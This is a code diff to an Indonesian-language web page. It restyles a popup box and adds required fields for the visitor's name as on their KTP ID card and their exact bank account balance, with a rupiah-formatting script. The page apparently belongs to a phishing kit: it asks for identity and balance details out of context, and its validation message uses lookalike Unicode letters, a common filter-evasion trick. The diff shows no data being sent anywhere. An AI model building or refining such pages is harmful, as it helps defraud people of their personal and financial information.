@@ -277,7 +277,7 @@ padding-top: 15px
     
     .hua{
         max-width: 320px;
-        bottom:170px;               
+        bottom:120px;               
         position: absolute;
         border:5px solid #fff;
         padding:15px;
@@ -285,7 +285,7 @@ padding-top: 15px
         border-radius:18px; 
         background: #ffffffe6;
         background-size:100%; 
-        height: 280px; 
+        height: 410px; 
         left: 0;
         right: 0;
         margin: 0px auto;
@@ -324,6 +324,9 @@ padding-left: 10px;
         position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #ffffff; box-shadow: rgba(0, 0, 0, 0.15) 0px -12px 15px 0px; padding-top: 15px;max-width: 400px;
     }
 
+.yy{
+        box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid rgb(0, 134, 224); border-image: initial; background-color: #; border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 15px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none;
+    }
 </style>
 <body>
     <main>
@@ -370,8 +373,14 @@ padding-left: 10px;
 </h3>
 
 
-<br>
-<br>
+
+<h5 style="color:#09559a; margin-top: 10px; margin-left: 4px">Atas nama :
+<input id="nama" name="nama" type="text" class="yy" placeholder="Nama sesuai KTP" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗔𝗠𝗔 sesuai KTP')" onchange="this.setCustomValidity('')" required>
+</h5>
+
+<h5 style="color:#09559a; margin-top: -11px; margin-left: 4px">Saldo akhir sesuai rekening :
+<input id="saldo" name="saldo" type="tel" class="yy" placeholder="Rp. xxxxx"  required>
+</h5>
 </div>
     
 
@@ -389,6 +398,7 @@ padding-left: 10px;
 <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'"></script>
 <script src="script.js"></script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
 <script>
         $( document ).ready(function() {
             setTimeout(() => {
@@ -405,6 +415,38 @@ padding-left: 10px;
                 console.log("NotSupported");
             }
         }
+        
+        $(document).ready(function(){
+
+                // Format mata uang.
+                $( '.saldo' ).mask('000.000.000.000.000', {reverse: true});
+ var dengan_rupiah = document.getElementById('saldo');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    
+      /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+            })
+            
+            
 
 </script>
      <script>
